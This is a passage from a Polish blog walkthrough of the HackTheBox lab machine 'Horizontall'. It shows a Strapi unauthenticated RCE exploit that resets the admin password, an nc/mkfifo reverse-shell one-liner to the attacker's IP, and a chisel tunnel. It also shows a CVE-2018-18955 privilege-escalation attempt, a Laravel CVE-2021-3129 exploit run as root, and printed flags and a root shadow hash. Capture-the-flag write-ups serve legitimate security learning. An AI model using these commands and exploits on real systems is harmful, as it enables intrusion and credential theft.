<span style="color:#f92672">&lt;!--</span> <span style="color:#a6e22e">A</span> <span style="color:#a6e22e">lot</span> <span style="color:#a6e22e">of</span> <span style="color:#a6e22e">magic</span> <span style="color:#a6e22e">happens</span> <span style="color:#a6e22e">in</span> <span style="color:#66d9ef">this</span> <span style="color:#a6e22e">file</span><span style="color:#f92672">.</span> <span style="color:#a6e22e">HtmlWebpackPlugin</span> <span style="color:#a6e22e">automatically</span> <span style="color:#a6e22e">includes</span> <span style="color:#a6e22e">all</span> <span style="color:#a6e22e">assets</span> (<span style="color:#a6e22e">e</span><span style="color:#f92672">.</span><span style="color:#a6e22e">g</span><span style="color:#f92672">.</span> <span style="color:#a6e22e">bundle</span><span style="color:#f92672">.</span><span style="color:#a6e22e">js</span>, <span style="color:#a6e22e">main</span><span style="color:#f92672">.</span><span style="color:#a6e22e">css</span>) <span style="color:#a6e22e">with</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">correct</span> <span style="color:#a6e22e">HTML</span> <span style="color:#a6e22e">tags</span>, <span style="color:#a6e22e">which</span> <span style="color:#a6e22e">is</span> <span style="color:#a6e22e">why</span> <span style="color:#a6e22e">they</span> <span style="color:#a6e22e">are</span> <span style="color:#a6e22e">missing</span> <span style="color:#a6e22e">in</span> <span style="color:#66d9ef">this</span> <span style="color:#a6e22e">HTML</span> <span style="color:#a6e22e">file</span><span style="color:#f92672">.</span> <span style="color:#a6e22e">Don</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">t</span> <span style="color:#a6e22e">add</span> <span style="color:#a6e22e">any</span> <span style="color:#a6e22e">assets</span> <span style="color:#a6e22e">here</span><span style="color:#f92672">!</span> (<span style="color:#a6e22e">Check</span> <span style="color:#a6e22e">out</span> <span style="color:#a6e22e">webpackconfig</span><span style="color:#f92672">.</span><span style="color:#a6e22e">js</span> <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">you</span> <span style="color:#a6e22e">want</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">know</span> <span style="color:#a6e22e">more</span>) <span style="color:#f92672">--&gt;</span>
<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/admin/runtime~main.d078dc17.js&#34;</span><span style="color:#f92672">&gt;&lt;/</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#a6e22e">script</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/admin/main.da91597e.chunk.js&#34;</span><span style="color:#f92672">&gt;&lt;/</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;&lt;/</span><span style="color:#a6e22e">body</span><span style="color:#f92672">&gt;</span>
<span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">html</span><span style="color:#f92672">&gt;</span>
</code></pre></div><p>Powyżej jest wspomniane o <code>phpwebpackconfig.js</code>, ale szybkim sprawdzeniu nie ma takiego pliku. Natomiast sprawdziłem, że <code>Strapi</code> generalnie ma taki plik, tylko nazywa się <code>webpack.config.js</code>. Zawiera on m.in informacje o wersji <code>Strapi</code>. Nie wiem czy to celowy zabieg czy nie, czy też może robię coś nie tak.</p>
<hr>
<h2 id="searchsploit">Searchsploit<a hidden class="anchor" aria-hidden="true" href="#searchsploit">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/horizontall<span style="color:#f92672">]</span>
└─$ searchsploit strapi  
------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                      |  Path
------------------------------------------------------------------------------------ ---------------------------------
Strapi 3.0.0-beta - Set Password <span style="color:#f92672">(</span>Unauthenticated<span style="color:#f92672">)</span>                                  | multiple/webapps/50237.py
Strapi 3.0.0-beta.17.7 - Remote Code Execution <span style="color:#f92672">(</span>RCE<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Authenticated<span style="color:#f92672">)</span>                | multiple/webapps/50238.py
Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution <span style="color:#f92672">(</span>RCE<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Unauthenticated<span style="color:#f92672">)</span>          | multiple/webapps/50239.py
------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
Papers: No Results
</code></pre></div><p>Nie mam innego punktu zaczepienia niż sprawdzić chociaż ostatni exploit. Pierwszy odpada, bo nie znam maila potrzebnego do działania exploitu.</p>
<hr>
<h2 id="strapi-cms-300-beta174---remote-code-execution-rce-unauthenticated">Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)<a hidden class="anchor" aria-hidden="true" href="#strapi-cms-300-beta174---remote-code-execution-rce-unauthenticated">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/horizontall<span style="color:#f92672">]</span>
└─$ python3 50239.py http://api-prod.horizontall.htb/         
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Checking Strapi CMS Version running
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Seems like the exploit will work!!!
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Executing exploit


<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Password reset was successfully
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Your email is: admin@horizontall.htb
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Your new credentials are: admin:SuperStrongPassword1
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQzODg2MzIwLCJleHAiOjE2NDY0NzgzMjB9.6dNeTvgIJZ-r-ABsotdJX1zNvvY-9mxaK0NPRs-p4QU
</code></pre></div><p>Super, <code>admin@horizontall.htb:SuperStrongPassword1</code></p>
<p><img loading="lazy" src="static/screenshots/Pasted%20image%2020220203120716.png" alt=""  />
</p>
<p>Strapi v3.0.0-beta.17.4</p>
<hr>
<h2 id="reverse-shell">Reverse shell<a hidden class="anchor" aria-hidden="true" href="#reverse-shell">#</a></h2>
<p>W naszym exploicie nie widać odpowiedzi na komendy, natomiast wykonuje on komendy, dowodem jest nasłuchiwanie pingów na mojej maszynie, pokazane poniżej</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$&gt; ping 10.10.14.224
</code></pre></div><p><img loading="lazy" src="static/screenshots/Pasted%20image%2020220203121456.png" alt=""  />
</p>
<p>Zatem możemy stworzyć połączenie</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$&gt; rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.224 <span style="color:#ae81ff">9010</span> &gt;/tmp/f
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Triggering Remote code executin
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Rember this is a blind RCE don<span style="color:#960050;background-color:#1e0010">&#39;</span>t expect to see output
</code></pre></div><p><img loading="lazy" src="static/screenshots/Pasted%20image%2020220203122507.png" alt=""  />
</p>
<p>user.txt
<code>9574577aa60e3a61978c0ad62bff2256</code></p>
<hr>
<h1 id="privilege-escalation">Privilege Escalation<a hidden class="anchor" aria-hidden="true" href="#privilege-escalation">#</a></h1>
<p>Sprawdziłem maszynę skryptem <code>Linpeas</code>, ale nie znalazłem na pierwszy rzut oka ciekawych scieżek. Dlatego spróbowałem również innym skryptem - <code>Linux Exploit Suggester</code>, który wskazał jedną z podatności.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>CVE-2018-18955<span style="color:#f92672">]</span> subuid_shell                                                                                     
                                                                                                                      
   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id<span style="color:#f92672">=</span><span style="color:#ae81ff">1712</span>                                            
   Exposure: probable                                                                                                 
   Tags: <span style="color:#f92672">[</span> ubuntu<span style="color:#f92672">=</span>18.04 <span style="color:#f92672">]{</span>kernel:4.15.0-20-generic<span style="color:#f92672">}</span>,fedora<span style="color:#f92672">=</span>28<span style="color:#f92672">{</span>kernel:4.16.3-301.fc28<span style="color:#f92672">}</span>                                 
   Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/45886.zip         
   Comments: CONFIG_USER_NS needs to be enabled
</code></pre></div><p>Jeżeli jeżeli chodzi o distro, to faktycznie jest to <code>Ubuntu 18.04</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat /etc/os-release
NAME<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Ubuntu&#34;</span>
VERSION<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;18.04.5 LTS (Bionic Beaver)&#34;</span>
ID<span style="color:#f92672">=</span>ubuntu
ID_LIKE<span style="color:#f92672">=</span>debian
PRETTY_NAME<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Ubuntu 18.04.5 LTS&#34;</span>
VERSION_ID<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;18.04&#34;</span>
HOME_URL<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://www.ubuntu.com/&#34;</span>
SUPPORT_URL<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://help.ubuntu.com/&#34;</span>
BUG_REPORT_URL<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://bugs.launchpad.net/ubuntu/&#34;</span>
PRIVACY_POLICY_URL<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://www.ubuntu.com/legal/terms-and-policies/privacy-policy&#34;</span>
VERSION_CODENAME<span style="color:#f92672">=</span>bionic
UBUNTU_CODENAME<span style="color:#f92672">=</span>bionic
strapi@horizontall:/tmp/p$
</code></pre></div><p>Dlatego postanowiłem spróbować tego exploita.</p>
<p><a href="https://github.com/scheatkode/CVE-2018-18955">https://github.com/scheatkode/CVE-2018-18955</a></p>
<p><img loading="lazy" src="static/screenshots/Pasted%20image%2020220203140109.png" alt=""  />
</p>
<p><code>subuid_shell</code> jest priorytetem, dlatego jego zuploudowałem jako pierwszego. A poniżej wykonanie tego exploita</p>
<pre tabindex="0"><code>./subuid_shell
[.] starting
[.] setting up namespace
[~] done, namespace sandbox set up
[.] mapping subordinate ids
[.] subuid: 231072
[.] subgid: 231072
[~] done, mapped subordinate ids
[.] executing subshell
whoami
whoami
root
root@horizontall:/tmp/p#
</code></pre><p>:)</p>
<p>Okazało się, że jednak w ten sposób nie mogę dokonać eskalacji uprawnień. W teorii mam roota, ale wszystkie pliki mają właścicieli <code>nouser</code> i <code>nogroup</code>. Exploit nie działa, albo twórca tej maszyny sprawił, że ten exploit nie działa :)</p>
<p>Muszę znaleźć inny sposób.</p>
<hr>
<h2 id="netstat">Netstat<a hidden class="anchor" aria-hidden="true" href="#netstat">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">(</span>netstat -punta <span style="color:#f92672">||</span> ss --ntpu<span style="color:#f92672">)</span> | grep <span style="color:#e6db74">&#34;127.0&#34;</span>                                                                                                                                                                                        <span style="color:#f92672">[</span>144/144<span style="color:#f92672">]</span>
tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                                                                                                                                                            
tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                                                                                                                                                            
tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:1337          0.0.0.0:*               LISTEN      1878/node /usr/bin/
</code></pre></div><p>Pod portem <code>1337</code> mamy API, pod <code>3306</code> jest MySQL a pod <code>8000</code> jest Laravel v8 (PHP v7.4.18). Nie znalazłem nic ciekawego pod kątem bezpośrednich exploitów dlatego stworzyłem połączenie poprzez <code>chisel</code>.</p>
<hr>
<h2 id="chisel">Chisel<a hidden class="anchor" aria-hidden="true" href="#chisel">#</a></h2>
<p>Nasłuchuję u mnie</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">chisel server --reverse -p <span style="color:#ae81ff">8001</span>
</code></pre></div><p>Tworzę połączenie na maszynie HTB</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">./chisel.1 client 10.10.14.224:8001 R:7000:127.0.0.1:8000
</code></pre></div><p><img loading="lazy" src="static/screenshots/Pasted%20image%2020220203205339.png" alt=""  />
</p>
<p>W Laravelu pierwsze co warto sprawdzić to czy jest włączony tryb debugowania poprzez dodanie <code>/profiles</code> do linku.</p>
<p><img loading="lazy" src="static/screenshots/Pasted%20image%2020220203210758.png" alt=""  />
</p>
<p>Jak widać w tym przypadku jest, mogę podejrzeć zatem dokładną wersje Laravela.</p>
<p>Po wpisaniu wersji PHP i Laravela w Google otrzymałem jako pierwszy wynik <code>CVE-2021-3129</code>.</p>
<p><img loading="lazy" src="static/screenshots/Pasted%20image%2020220203210643.png" alt=""  />
</p>
<p>Coś jednak nie działo,znalazłem na Githubie innego exploita na tą podatność:</p>
<p><a href="https://github.com/nth347/CVE-2021-3129_exploit">https://github.com/nth347/CVE-2021-3129_exploit</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/horizontall/CVE-2021-3129_exploit<span style="color:#f92672">]</span>
└─$ ./exploit.py http://localhost:7000 Monolog/RCE1 <span style="color:#e6db74">&#34;id&#34;</span>
<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> Trying to clear logs
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Logs cleared
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> PHPGGC found. Generating payload and deploy it to the target
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Successfully converted logs to PHAR
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> PHAR deserialized. Exploited

uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>

<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> Trying to clear logs
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Logs cleared
</code></pre></div><p>Próba wyświetlenia flagi:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/horizontall/CVE-2021-3129_exploit<span style="color:#f92672">]</span>
└─$ ./exploit.py http://localhost:7000 Monolog/RCE1 <span style="color:#e6db74">&#34;cat /root/root.txt&#34;</span>
<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> Trying to clear logs
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Logs cleared
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> PHPGGC found. Generating payload and deploy it to the target
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Successfully converted logs to PHAR
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> PHAR deserialized. Exploited

fee3519f7a12a76751d87c80ecdeb288

<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> Trying to clear logs
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Logs cleared
</code></pre></div><p>root.txt</p>
<p><code>fee3519f7a12a76751d87c80ecdeb288</code></p>
<p>/etc/shadow - root
<code>root:$6$rGxQBZV9$SbzCXDzp1MEx7xxXYuV5voXCy4k9OdyCDbyJcWuETBujfMrpfVtTXjbx82bTNlPK6Ayg8SqKMYgVlYukVOKJz1:18836:0:99999:7:::</code></p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://lavatann.github.io/tags/linux/">Linux</a></li>
      <li><a href="https://lavatann.github.io/tags/easy/">Easy</a></li>
      <li><a href="https://lavatann.github.io/tags/retired/">Retired</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="https://lavatann.github.io/posts/hackthebox/heist/">
    <span class="title">« Prev Page</span>
    <br>
    <span>Heist - HackTheBox</span>
  </a>
  <a class="next" href="https://lavatann.github.io/posts/hackthebox/logforge/">
    <span class="title">Next Page »</span>
    <br>
    <span>LogForge - HackTheBox</span>
  </a>
</nav>


<div class="share-buttons">
    <a target="_blank" rel="noopener noreferrer" aria-label="share Horizontall - HackTheBox on twitter"
        href="https://twitter.com/intent/tweet/?text=Horizontall%20-%20HackTheBox&amp;url=https%3a%2f%2flavatann.github.io%2fposts%2fhackthebox%2fhorizontall%2f&amp;hashtags=Linux%2cEasy%2cRetired">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-253.927,424.544c135.939,0 210.268,-112.643 210.268,-210.268c0,-3.218 0,-6.437 -0.153,-9.502c14.406,-10.421 26.973,-23.448 36.935,-38.314c-13.18,5.824 -27.433,9.809 -42.452,11.648c15.326,-9.196 26.973,-23.602 32.49,-40.92c-14.252,8.429 -30.038,14.56 -46.896,17.931c-13.487,-14.406 -32.644,-23.295 -53.946,-23.295c-40.767,0 -73.87,33.104 -73.87,73.87c0,5.824 0.613,11.494 1.992,16.858c-61.456,-3.065 -115.862,-32.49 -152.337,-77.241c-6.284,10.881 -9.962,23.601 -9.962,37.088c0,25.594 13.027,48.276 32.95,61.456c-12.107,-0.307 -23.448,-3.678 -33.41,-9.196l0,0.92c0,35.862 25.441,65.594 59.311,72.49c-6.13,1.686 -12.72,2.606 -19.464,2.606c-4.751,0 -9.348,-0.46 -13.946,-1.38c9.349,29.426 36.628,50.728 68.965,51.341c-25.287,19.771 -57.164,31.571 -91.8,31.571c-5.977,0 -11.801,-0.306 -17.625,-1.073c32.337,21.15 71.264,33.41 112.95,33.41Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share Horizontall - HackTheBox on linkedin"
        href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2flavatann.github.io%2fposts%2fhackthebox%2fhorizontall%2f&amp;title=Horizontall%20-%20HackTheBox&amp;summary=Horizontall%20-%20HackTheBox&amp;source=https%3a%2f%2flavatann.github.io%2fposts%2fhackthebox%2fhorizontall%2f">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share Horizontall - HackTheBox on reddit"
        href="https://reddit.com/submit?url=https%3a%2f%2flavatann.github.io%2fposts%2fhackthebox%2fhorizontall%2f&title=Horizontall%20-%20HackTheBox">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share Horizontall - HackTheBox on facebook"
        href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2flavatann.github.io%2fposts%2fhackthebox%2fhorizontall%2f">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share Horizontall - HackTheBox on whatsapp"
        href="https://api.whatsapp.com/send?text=Horizontall%20-%20HackTheBox%20-%20https%3a%2f%2flavatann.github.io%2fposts%2fhackthebox%2fhorizontall%2f">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share Horizontall - HackTheBox on telegram"
        href="https://telegram.me/share/url?text=Horizontall%20-%20HackTheBox&amp;url=https%3a%2f%2flavatann.github.io%2fposts%2fhackthebox%2fhorizontall%2f">
        <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28">
            <path
                d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
        </svg>
    </a>
</div>

  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2022 <a href="https://lavatann.github.io">Lavatann</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
